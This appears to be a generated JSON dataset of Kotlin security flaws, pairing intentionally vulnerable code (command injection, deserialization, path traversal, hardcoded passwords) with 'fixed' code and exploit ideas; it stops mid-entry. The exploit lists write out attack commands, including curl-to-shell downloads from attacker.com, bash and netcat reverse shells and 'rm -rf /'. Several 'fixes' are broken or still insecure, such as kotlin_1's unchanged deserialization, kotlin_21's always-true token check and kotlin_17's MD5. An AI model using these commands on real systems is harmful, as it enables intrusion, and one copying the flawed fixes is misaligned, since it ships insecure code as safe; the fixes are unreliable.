{
    "kotlin_0": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import kotlin.reflect.jvm.javaMethod\nclass VulnerableClass {\\n    fun executeCommand(command: String) {\\n        val processBuilder = ProcessBuilder(listOf(\\\"bash\\\", \\\"-c\\\", command))\\n        processBuilder.redirectErrorStream(true)\\n        val process = processBuilder.start()\\n        val reader = process.inputStream.bufferedReader()\\n        var line: String?\\n        while (reader.readLine().also { line = it } != null) {\\n            println(line)\\n        }\\n    }\\n}",
        "cvss_score": 8.2,
        "fixed_code": "import kotlin.reflect.jvm.javaMethod\nclass SafeClass {\n    private val allowedCommands = listOf(\"ls\", \"whoami\")\n\n    fun executeCommand(command: String) {\n        if (command in allowedCommands) {\n            val processBuilder = ProcessBuilder(listOf(command))\n            processBuilder.redirectErrorStream(true)\n            val process = processBuilder.start()\n            val reader = process.inputStream.bufferedReader()\n            var line: String?\n            while (reader.readLine().also { line = it } != null) {\n                println(line)\n            }\n        } else {\n            println(\"Command not allowed\")\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the system.",
            "They can use 'curl attacker.com/malware.sh | bash' to download and execute malicious scripts.",
            "Could chain commands like 'ls; cat /etc/passwd' to list files and leak sensitive information."
        ]
    },
    "kotlin_1": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import java.io.ByteArrayInputStream\nimport java.io.ObjectInputStream\nfun main() {\n    val serializedData = \"aced00057372001a6b6f746c696e2e4d616c6963696f75734578616d706c65243200000000000000017200166b6f746c696e2e4d616c6963696f75734578616d706c6500000000000000000001020000787071007e000270770c000000436f6d6d616e6420746f2065786563757465\".decodeToByteArray()\n    val bais = ByteArrayInputStream(serializedData)\n    val ois = ObjectInputStream(bais)\n    val obj = ois.readObject()\n}",
        "cvss_score": 8.2,
        "fixed_code": "import java.io.ByteArrayInputStream\nfun main() {\n    val serializedData = \"aced00057372001a6b6f746c696e2e4d616c6963696f75734578616d706c65243200000000000000017200166b6f746c696e2e4d616c6963696f75734578616d706c6500000000000000000001020000787071007e000270770c000000436f6d6d616e6420746f2065786563757465\".decodeToByteArray()\n    val bais = ByteArrayInputStream(serializedData)\n    try {\n        val ois = java.io.ObjectInputStream(bais)\n        val obj = ois.readObject()\n        // Perform safe operations with obj\n    } catch (e: Exception) {\n        println(\"Deserialization error: ${e.message}\")\n    }\n}",
        "exploit_ways": [
            "An attacker could send a malicious serialized object to execute arbitrary code on the server.",
            "By crafting a specific payload, an attacker can exploit deserialization vulnerabilities to gain unauthorized access or escalate privileges.",
            "Attackers may use this vulnerability to perform denial-of-service attacks by sending malformed objects that cause the application to crash."
        ]
    },
    "kotlin_2": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun unsafeExecute(command: String) { val process = Runtime.getRuntime().exec(command) process.waitFor() }",
        "cvss_score": 8.2,
        "fixed_code": "fun safeExecute(command: String) { val allowedCommands = listOf(\"ls\", \"whoami\") if (command in allowedCommands) { val process = Runtime.getRuntime().exec(command) process.waitFor() } else { throw IllegalArgumentException(\"Command not allowed\") } }",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_3": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "fun main() {\n    val buffer = ByteArray(10)\n    System.`in`.read(buffer)\n    println(String(buffer))\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun main() {\n    val buffer = ByteArray(10)\n    val bytesRead = System.`in`.read(buffer)\n    if (bytesRead > -1) {\n        println(String(buffer, 0, bytesRead))\n    }\n}",
        "exploit_ways": [
            "An attacker can input more than 10 bytes to overflow the buffer and potentially execute arbitrary code.",
            "Overwriting return addresses in the stack by providing a specially crafted input can lead to control flow hijacking.",
            "Exploiting the overflow could allow an attacker to overwrite adjacent memory, corrupting program state."
        ]
    },
    "kotlin_4": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nfun executeCommand(cmd: String) {\n    val processBuilder = ProcessBuilder(*cmd.split(\"\\\\s+\").toTypedArray())\n    val process = processBuilder.start()\n    val reader = BufferedReader(InputStreamReader(process.inputStream))\n    var line: String?\n    while (reader.readLine().also { line = it } != null) {\n        println(line)\n    }\n}",
        "cvss_score": 8.6,
        "fixed_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nfun executeCommand(cmd: String) {\n    val allowedCommands = listOf(\"ls\", \"whoami\")\n    if (cmd !in allowedCommands) {\n        println(\"Command not allowed\")\n        return\n    }\n    val processBuilder = ProcessBuilder(*cmd.split(\"\\\\s+\").toTypedArray())\n    val process = processBuilder.start()\n    val reader = BufferedReader(InputStreamReader(process.inputStream))\n    var line: String?\n    while (reader.readLine().also { line = it } != null) {\n        println(line)\n    }\n}",
        "exploit_ways": [
            "User could input 'ls; rm -rf /' to execute multiple commands including deleting system files.",
            "Could use 'whoami; cat /etc/passwd' to leak sensitive information by chaining commands.",
            "Input like 'ls && curl attacker.com/malware.sh | sh' can download and execute malicious scripts."
        ]
    },
    "kotlin_5": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileLoader {\n    fun loadFile(path: String): String? {\n        return java.io.File(path).readText()\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.nio.file.Paths\nimport java.nio.file.Files\nclass SecureFileLoader {\n    val baseDir = Paths.get(\"/safe/directory\")\n    fun loadFile(path: String): String? {\n        val resolvedPath = baseDir.resolve(path).normalize()\n        if (!resolvedPath.startsWith(baseDir)) return null\n        return Files.readString(resolvedPath)\n    }\n}",
        "exploit_ways": [
            "An attacker could input '../etc/passwd' to read sensitive system files.",
            "They might use '../../var/log/syslog' to access log files containing sensitive information.",
            "Crafting a path like '../../../../../../flag.txt' can lead to the disclosure of critical data."
        ]
    },
    "kotlin_6": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun executeCommand(command: String) {\\n    val process = Runtime.getRuntime().exec(command)\\n    process.waitFor()\\n}",
        "cvss_score": 8.2,
        "fixed_code": "fun executeCommand(command: List<String>) {\\n    val processBuilder = ProcessBuilder(command)\\n    processBuilder.start().waitFor()\\n}",
        "exploit_ways": [
            "An attacker can input 'bash -c \\\"rm -rf /\\\"' to delete system files.",
            "They can use 'bash -i >& /dev/tcp/attacker.com/1234 0>&1' to gain reverse shell access.",
            "Could chain commands like 'bash -c \\\"ls; cat /etc/passwd\\\"' to leak sensitive information."
        ]
    },
    "kotlin_7": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseManager {\\n    fun getUserData(userId: String): String {\\n        val query = \"SELECT * FROM users WHERE id = '\" + userId + \"'\";\\n        // Execute the query...\\n        return \\\"User data for ID: $userId\\\"\\n    }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "class DatabaseManager {\\n    fun getUserData(userId: String): String {\\n        val query = \"SELECT * FROM users WHERE id = ?\";\\n        // Execute the query with parameter binding...\\n        return \\\"User data for ID: $userId\\\"\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user data.",
            "They can use a UNION SELECT attack to extract sensitive information from other tables.",
            "Input like '; DROP TABLE users' can delete critical user data."
        ]
    },
    "kotlin_8": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "fun authenticate(username: String, password: String): Boolean {\n    val storedCredentials = mapOf(\"admin\" to \"password123\", \"user\" to \"letmein\")\n    return storedCredentials[username] == password\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun authenticate(username: String, password: String): Boolean {\n    val storedCredentials = mapOf(\"admin\" to hashPassword(\"password123\"), \"user\" to hashPassword(\"letmein\"))\n    return checkPassword(storedCredentials[username], password)\n}\n\nfun hashPassword(password: String): String {\n    // Implement a secure hashing algorithm here, e.g., bcrypt\n    return BCrypt.hashpw(password, BCrypt.gensalt())\n}\n\nfun checkPassword(hashedPassword: String?, password: String): Boolean {\n    if (hashedPassword == null) return false\n    return BCrypt.checkpw(password, hashedPassword)\n}",
        "exploit_ways": [
            "An attacker could try common passwords or brute force to guess the credentials.",
            "If default credentials are used, an attacker can simply log in with 'admin' and 'password123'.",
            "By knowing a valid username, an attacker might focus on guessing only that user's password."
        ]
    },
    "kotlin_9": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nclass Exploit {\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val command = \"whoami\"\n            val process = Runtime.getRuntime().exec(command)\n            val reader = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (reader.readLine().also { line = it } != null) {\n                println(line)\n            }\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nclass Exploit {\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val command = arrayOf(\"whoami\")\n            val process = Runtime.getRuntime().exec(command)\n            val reader = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (reader.readLine().also { line = it } != null) {\n                println(line)\n            }\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could modify the 'command' variable to execute other system commands with potentially higher privileges.",
            "The vulnerability allows running arbitrary commands by changing the command string, enabling privilege escalation if run as a privileged user.",
            "By modifying the command to include malicious scripts or binaries, an attacker can compromise the system's integrity."
        ]
    },
    "kotlin_10": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth {\\n    private var storedPasswordHash = \"8d969eef6ecad3c29a3a629280e686cff8cae4f8b5a731783fb0e5537cc169ba\"\\n    fun authenticate(inputPassword: String): Boolean {\\n        val inputHash = hashPassword(inputPassword)\\n        return inputHash == storedPasswordHash\\n    }\\n    private fun hashPassword(password: String): String {\\n        val bytes = MessageDigest.getInstance(\"SHA-256\").digest(password.toByteArray())\\n        return BigInteger(1, bytes).toString(16).padStart(64, '0')\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class UserAuth {\\n    private val storedPasswordHash = \"8d969eef6ecad3c29a3a629280e686cff8cae4f8b5a731783fb0e5537cc169ba\"\\n    private val storedSalt = \"randomsalt123\"\\n    fun authenticate(inputPassword: String): Boolean {\\n        val inputHash = hashPasswordWithSalt(inputPassword, storedSalt)\\n        return MessageDigest.isEqual(inputHash.toByteArray(), storedPasswordHash.toByteArray())\\n    }\\n    private fun hashPasswordWithSalt(password: String, salt: String): String {\\n        val bytes = (salt + password).toByteArray()\\n        val digest = MessageDigest.getInstance(\"SHA-256\").digest(bytes)\\n        return BigInteger(1, digest).toString(16).padStart(64, '0')\\n    }\\n}",
        "exploit_ways": [
            "An attacker could use brute force to guess the password due to a weak hash comparison.",
            "If the hash is known, an attacker could potentially find precomputed hash collisions or rainbow tables.",
            "Lack of rate limiting or account lockout mechanisms allows repeated failed login attempts."
        ]
    },
    "kotlin_11": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "fun executeCommand() {\n    val userInput = readLine()\n    ProcessBuilder(userInput).start()\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun executeCommand() {\n    val allowedCommands = listOf(\"ls\", \"whoami\")\n    val userInput = readLine()\n    if (userInput in allowedCommands) {\n        ProcessBuilder(userInput).start()\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_12": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n@WebServlet(\"/transfer\")\nclass TransferServlet : HttpServlet() {\n    override fun doPost(req: HttpServletRequest, resp: HttpServletResponse) {\n        val amount = req.getParameter(\"amount\")?.toIntOrNull()\n        val recipient = req.getParameter(\"recipient\")\n        if (amount != null && recipient != null) {\n            // Simulate transferring funds\n            println(\"Transferred $amount to $recipient\")\n            resp.status = HttpServletResponse.SC_OK\n        } else {\n            resp.sendError(HttpServletResponse.SC_BAD_REQUEST)\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import javax.servlet.http.HttpServletRequest\nimport javax.servlet.http.HttpServletResponse\nimport javax.servlet.annotation.WebServlet\nimport javax.servlet.http.HttpServlet\n@WebServlet(\"/transfer\")\nclass TransferServlet : HttpServlet() {\n    override fun doPost(req: HttpServletRequest, resp: HttpServletResponse) {\n        val csrfToken = req.getParameter(\"csrfToken\")\n        if (csrfToken != req.session.getAttribute(\"expectedCsrfToken\")) {\n            resp.sendError(HttpServletResponse.SC_FORBIDDEN)\n            return\n        }\n        val amount = req.getParameter(\"amount\")?.toIntOrNull()\n        val recipient = req.getParameter(\"recipient\")\n        if (amount != null && recipient != null) {\n            // Simulate transferring funds\n            println(\"Transferred $amount to $recipient\")\n            resp.status = HttpServletResponse.SC_OK\n        } else {\n            resp.sendError(HttpServletResponse.SC_BAD_REQUEST)\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could trick a logged-in user into visiting a malicious website that contains a form auto-submitted to the /transfer endpoint, causing unauthorized transfers.",
            "Using JavaScript on a compromised site, an attacker can craft requests to transfer funds from the victim's account without their knowledge or consent.",
            "By sending crafted HTTP POST requests with pre-known parameters, an attacker can exploit this vulnerability if they manage to intercept session cookies."
        ]
    },
    "kotlin_13": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "fun updateEmail(newEmail: String) {\n    val url = \"http://example.com/update?email=$newEmail\"\n    // Simulate HTTP request\n}",
        "cvss_score": 6.5,
        "fixed_code": "fun updateEmail(newEmail: String, token: String) {\n    val url = \"http://example.com/update?email=$newEmail&csrf_token=$token\"\n    // Simulate HTTP request with CSRF token\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that, when visited by an authenticated user, changes their email address.",
            "By embedding the malicious URL in an iframe or loading it via JavaScript, an attacker can silently change the user's email without their knowledge.",
            "Using social engineering tactics, attackers can trick users into clicking on links that perform unauthorized actions on their behalf."
        ]
    },
    "kotlin_14": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun executeCommand() {\\n    val command = readLine()!!\\n    Runtime.getRuntime().exec(command)\\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun executeCommand() {\\n    val allowedCommands = listOf(\"echo\", \"ls\")\\n    val userInput = readLine()!!\\n    if (userInput in allowedCommands) {\\n        Runtime.getRuntime().exec(userInput)\\n    } else {\\n        println(\"Command not allowed\")\\n    }\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'nc attacker.com 1234 -e /bin/sh' to open a reverse shell.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_15": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "class VulnerableApp {\n    private var adminAccess: Boolean = false\n    fun login(password: String) {\n        if (password == \"secret\") {\n            adminAccess = true\n        }\n    }\n    fun executeCommand(command: String) {\n        if (adminAccess) {\n            Runtime.getRuntime().exec(command)\n        }\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class SecureApp {\n    private var adminAccess: Boolean = false\n    fun login(password: String) {\n        val securePassword = \"strong_secure_password\"\n        if (password == securePassword) {\n            adminAccess = true\n        }\n    }\n    fun executeCommand(command: String) {\n        if (adminAccess && isCommandAllowed(command)) {\n            Runtime.getRuntime().exec(command)\n        } else {\n            throw SecurityException(\"Unauthorized command execution attempt\")\n        }\n    }\n    private fun isCommandAllowed(command: String): Boolean {\n        val allowedCommands = listOf(\"ls\", \"whoami\")\n        return command in allowedCommands\n    }\n}",
        "exploit_ways": [
            "An attacker can guess or brute-force the password to gain admin access.",
            "Once admin, they can execute system commands like 'rm -rf /' leading to data loss.",
            "They might use the gained privileges to install backdoors or malware on the server."
        ]
    },
    "kotlin_16": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package com.example\n\nclass LoginActivity {\n\n    fun authenticate(username: String, password: String): Boolean {\n        return username == \"admin\" && password == \"password123\"\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "package com.example\n\nclass LoginActivity {\n\n    private val validUsername = \"admin\"\n    private val validPasswordHash = \"8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92\" // Hash of 'password123'\n\n    fun authenticate(username: String, password: String): Boolean {\n        val passwordHash = hashPassword(password)\n        return username == validUsername && passwordHash == validPasswordHash\n    }\n\n    private fun hashPassword(password: String): String {\n        // Implement a secure hashing algorithm here\n        return password.hashCode().toString() // Placeholder for actual hashing\n    }\n}",
        "exploit_ways": [
            "An attacker can use the default username 'admin' and password 'password123' to gain unauthorized access.",
            "If an attacker knows the codebase, they can directly modify or read the source code to find the credentials.",
            "Exploiting any adjacent services that trust this authentication could lead to a broader compromise of the system."
        ]
    },
    "kotlin_17": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package com.example.auth\n\nclass Authenticator {\n    private val users = mapOf(\"admin\" to \"password123\", \"user\" to \"letmein\")\n\n    fun authenticate(username: String, password: String): Boolean {\n        return if (users.containsKey(username)) {\n            val storedPasswordHash = hashPassword(users[username]!!)\n            slowCompare(storedPasswordHash, hashPassword(password))\n        } else {\n            false\n        }\n    }\n\n    private fun hashPassword(password: String): String {\n        return password.reversed() // Simplified non-cryptographic \"hashing\"\n    }\n\n    private fun slowCompare(a: String, b: String): Boolean {\n        if (a.length != b.length) return false\n        var result = 0\n        for (i in a.indices) {\n            result or= a[i].toInt() xor b[i].toInt()\n            Thread.sleep(50) // Simulate slow comparison\n        }\n        return result == 0\n    }\n}",
        "cvss_score": 7.8,
        "fixed_code": "package com.example.auth\n\nimport java.security.MessageDigest\n\nclass Authenticator {\n    private val users = mapOf(\"admin\" to \"205d194c36f6ff7fc29dc6dc2a5e4df3\", \"user\" to \"ee26b0dd4af7e749aa1a8ee3c10ae992\")\n\n    fun authenticate(username: String, password: String): Boolean {\n        return if (users.containsKey(username)) {\n            val storedPasswordHash = users[username]!!\n            slowCompare(storedPasswordHash, hashPassword(password))\n        } else {\n            false\n        }\n    }\n\n    private fun hashPassword(password: String): String {\n        val bytes = MessageDigest.getInstance(\"MD5\").digest(password.toByteArray())\n        return bytes.joinToString(\"\") { \"%02x\".format(it) }\n    }\n\n    private fun slowCompare(a: String, b: String): Boolean {\n        if (a.length != b.length) return false\n        var result = 0\n        for (i in a.indices) {\n            result or= a[i].toInt() xor b[i].toInt()\n            Thread.sleep(50)\n        }\n        return result == 0\n    }\n}",
        "exploit_ways": [
            "An attacker can try common username and password combinations to brute-force login.",
            "Using the slowCompare function, attackers could use timing attacks to infer correct characters in passwords by measuring response times.",
            "By observing the reversed hash mechanism, attackers might attempt to reverse-engineer user credentials from the stored hashes."
        ]
    },
    "kotlin_18": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "import java.nio.ByteBuffer\n\nclass NativeLib {\n    init {\n        System.loadLibrary(\"native-lib\")\n    }\n\n    external fun nativeMethod(byteArray: ByteArray)\n}\n\nclass BufferOverflowExample {\n    companion object {\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val lib = NativeLib()\n            val largeByteArray = ByteArray(1024 * 1024) // Large byte array to overflow buffer\n            lib.nativeMethod(largeByteArray)\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "import java.nio.ByteBuffer\n\nclass NativeLib {\n    init {\n        System.loadLibrary(\"native-lib\")\n    }\n\n    external fun nativeMethod(byteArray: ByteArray)\n}\n\nclass BufferOverflowExample {\n    companion object {\n        private const val MAX_BUFFER_SIZE = 1024 * 512 // Define a reasonable buffer size limit\n\n        @JvmStatic\n        fun main(args: Array<String>) {\n            val lib = NativeLib()\n            val byteArray = ByteArray(MAX_BUFFER_SIZE)\n            // Additional checks or logic to populate byteArray safely\n            lib.nativeMethod(byteArray)\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could craft a malicious payload that exceeds the buffer size, leading to arbitrary code execution.",
            "By inputting a specially crafted large byte array, an attacker might overwrite return addresses on the stack, causing the program to execute unintended code.",
            "Overflowing the buffer can corrupt adjacent memory, potentially leading to crashes or data leaks."
        ]
    },
    "kotlin_19": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nimport kotlin.system.exitProcess\n\nclass CommandExecutor {\n    fun execute(command: String) {\n        try {\n            val process = Runtime.getRuntime().exec(command)\n            val inputStream = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (inputStream.readLine().also { line = it } != null) {\n                println(line)\n            }\n            exitProcess(process.waitFor())\n        } catch (e: Exception) {\n            e.printStackTrace()\n        }\n    }\n}\n\nfun main(args: Array<String>) {\n    if (args.isNotEmpty()) {\n        val executor = CommandExecutor()\n        executor.execute(args[0])\n    }\n}",
        "cvss_score": 9.8,
        "fixed_code": "import java.io.BufferedReader\nimport java.io.InputStreamReader\nimport kotlin.system.exitProcess\n\nclass CommandExecutor {\n    private val allowedCommands = listOf(\"ls\", \"whoami\")\n    fun execute(command: String) {\n        if (command !in allowedCommands) {\n            println(\"Command not allowed\")\n            exitProcess(1)\n        }\n        try {\n            val process = Runtime.getRuntime().exec(arrayOf(\"sh\", \"-c\", command))\n            val inputStream = BufferedReader(InputStreamReader(process.inputStream))\n            var line: String?\n            while (inputStream.readLine().also { line = it } != null) {\n                println(line)\n            }\n            exitProcess(process.waitFor())\n        } catch (e: Exception) {\n            e.printStackTrace()\n        }\n    }\n}\n\nfun main(args: Array<String>) {\n    if (args.isNotEmpty()) {\n        val executor = CommandExecutor()\n        executor.execute(args[0])\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'rm -rf /' to delete all files on the system.",
            "They could use 'curl http://attacker.com/malware.sh | sh' to download and execute malicious code.",
            "Chaining commands like 'ls; cat /etc/passwd' could be used to list directory contents and view sensitive information."
        ]
    },
    "kotlin_20": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "fun main() {\n    val userInput = readLine()!!\n    Runtime.getRuntime().exec(userInput)\n}",
        "cvss_score": 8.2,
        "fixed_code": "fun main() {\n    val allowedCommands = listOf(\"ls\", \"whoami\")\n    val userInput = readLine()!!\n    if (userInput in allowedCommands) {\n        Runtime.getRuntime().exec(userInput)\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "kotlin_21": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "fun transferFunds(toAccount: String, amount: Double) {\n    // Simulate transferring funds to another account\n    println(\"Transferring $$amount to $toAccount\")\n}",
        "cvss_score": 7.5,
        "fixed_code": "fun transferFunds(toAccount: String, amount: Double, csrfToken: String) {\n    // Validate CSRF token before processing the request\n    if (validateCsrfToken(csrfToken)) {\n        println(\"Transferring $$amount to $toAccount\")\n    } else {\n        println(\"Invalid CSRF Token\")\n    }\n}\n\nfun validateCsrfToken(token: String): Boolean {\n    // Implement token validation logic here\n    return true // Placeholder for actual validation\n}",
        "exploit_ways": [
            "An attacker can trick a logged-in user into clicking a malicious link to transfer funds without their consent.",
            "By crafting a form submission with the victim's session cookies, an attacker can perform unauthorized fund transfers.",
            "Using social engineering tactics, an attacker could deceive users into executing actions on a compromised site that triggers CSRF vulnerabilities."
        ]
    },
    "kotlin_22": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "class UnsafeExecutor {\n    fun execute(command: String) {\n        Runtime.getRuntime().exec(command)\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "class SafeExecutor {\n    fun execute(command: List<String>) {\n        val processBuilder = ProcessBuilder(command)\n        processBuilder.start()\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'ls; rm -rf /' to delete all files.",
            "Could use 'curl http://attacker.com/malware.sh | sh' to download and execute malicious scripts.",
            "Input like 'whoami && sudo su' could escalate privileges if the system is misconfigured."
        ]
    },
    "kotlin_23": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "class VulnerableShell {\n    fun executeCommand(command: String) {\n        val process = Runtime.getRuntime().exec(command)\n        process.waitFor()\n    }\n}",
        "cvss_score": 8.2,
        "fixed_code": "class SecureShell {\n    fun executeCommand(command: String, vararg args: String) {\n        val processBuilder = ProcessBuilder(command).command(*args)\n        processBuilder.start().waitFor()\n    }\n}",
        "exploit_ways": [
            "An attacker can input 'echo vulnerable' ; rm -rf / to delete all files.",
            "Could use 'curl http://attacker.com/malware.sh | sh' to execute remote malicious scripts.",
            "Chaining commands like 'ls; cat /etc/passwd' could leak sensitive system information."
        ]
    },
    "kotlin_24": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import java.io.File\nimport java.io.FileReader\nclass FileLoader {\n    fun loadFile(path: String): String {\n        val file = File(path)\n        val reader = FileReader(file)\n        return reader.readText()\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.File\nimport java.io.FileReader\nclass FileLoader {\n    fun loadFile(baseDir: String, path: String): String {\n        val base = File(baseDir)\n        val file = File(base, path).canonicalFile\n        if (!file.startsWith(base)) throw IllegalArgumentException(\"Path traversal attack detected\")\n        val reader = FileReader(file)\n        return reader.readText()\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"../secret.txt\" to access files outside the intended directory.",
            "Using \"../../etc/passwd\" might allow reading sensitive system files.",
            "\"../../../../flag\" could be used in a CTF scenario to retrieve hidden flags."
        ]
    },
    "kotlin_25": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "import io.ktor.application.*\nimport io.ktor.response.*\nimport io.ktor.routing.*\nimport io.ktor.server.engine.*\nimport io.ktor.server.netty.*\n\nfun main() {\n    embeddedServer(Netty, port = 8080) {\n        routing {\n            get(\"/\") {\n                call.respondText(\"Hello, world!\")\n            }\n        }\n    }.start(wait = true)\n}",
        "cvss_score": 6.5,
        "fixed_code": "import io.ktor.application.*\nimport io.ktor.response.*\nimport io.ktor.routing.*\nimport io.ktor.server.engine.*\nimport io.ktor.server.netty.*\nimport io.ktor.http.content.SecurityHeaders\nimport io.ktor.features.ContentSecurityPolicy\nimport io.ktor.features.XFrameOptions\nimport io.ktor.features.XXSSProtection\nimport io.ktor.features.XContentTypeOptions\n\nfun main() {\n    embeddedServer(Netty, port = 8080) {\n        install(SecurityHeaders) {\n            contentSecurityPolicy { \n                policy Directives.defaultSrc(\"self\")\n            }\n            xFrameOptions(XFrameOptions.SameOrigin)\n            xXSSProtection()\n            xContentTypeOptions()\n        }\n        routing {\n            get(\"/\") {\n                call.respondText(\"Hello, world!\")\n            }\n        }\n    }.start(wait = true)\n}",
        "exploit_ways": [
            "An attacker can inject malicious scripts into web pages due to lack of Content Security Policy (CSP).",
            "Clickjacking attacks are possible because the X-Frame-Options header is missing.",
            "Reflected Cross-Site Scripting (XSS) attacks could occur as XSS protection headers are not set."
        ]
    },
    "kotlin_26": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "fun vulnerableRedirect(url: String) {\n    val intent = Intent(Intent.ACTION_VIEW).apply {\n        data = Uri.parse(url)\n    }\n    startActivity(intent)\n}",
        "cvss_score": 6.5,
        "fixed_code": "fun safeRedirect(url: String) {\n    val allowedHosts = listOf(\"example.com\", \"safeapp.com\")\n    val uri = Uri.parse(url)\n    if (uri.host in allowedHosts) {\n        val intent = Intent(Intent.ACTION_VIEW).apply {\n            data = uri\n        }\n        startActivity(intent)\n    } else {\n        // Handle error or log attempt\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site like 'http://malicious.com'.",
            "They could use the redirect to install malware by pointing to a malicious APK download URL.",
            "Attackers might exploit this to phish for user credentials by redirecting them to a fake login page."
        ]
    },
    "kotlin_27": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "class WebViewContainer : AppCompatActivity() {\\n    override fun onCreate(savedInstanceState: Bundle?) {\\n        super.onCreate(savedInstanceState)\\n        val webView = WebView(this)\\n        setContentView(webView)\\n        val webSettings = webView.settings\\n        webSettings.javaScriptEnabled = true\\n        webView.loadUrl(\"https://example.com\")\\n    }\\n}",
        "cvss_score": 3.1,
        "fixed_code": "class WebViewContainer : AppCompatActivity() {\\n    override fun onCreate(savedInstanceState: Bundle?) {\\n        super.onCreate(savedInstanceState)\\n        val webView = WebView(this)\\n        setContentView(webView)\\n        val webSettings = webView.settings\\n        webSettings.javaScriptEnabled = true\\n        webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)\\n        val transparentBackground = Color.parseColor(\"#00FFFFFF\")\\n        webView.setBackgroundColor(transparentBackground)\\n        webView.webChromeClient = WebChromeClient()\\n        webView.webViewClient = object : WebViewClient() {\\n            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {\\n                return if (Uri.parse(\"https://example.com\").host.equals(request?.url?.host)) {\\n                    false // Let the WebView load the URL\\n                } else {\\n                    true // Redirect to browser or block\\n                }\\n            }\\n        }\\n        webView.loadUrl(\"https://example.com\")\\n    }\\n}",
        "exploit_ways": [
            "An attacker could overlay a transparent WebView over a legitimate site and trick users into clicking malicious buttons.",
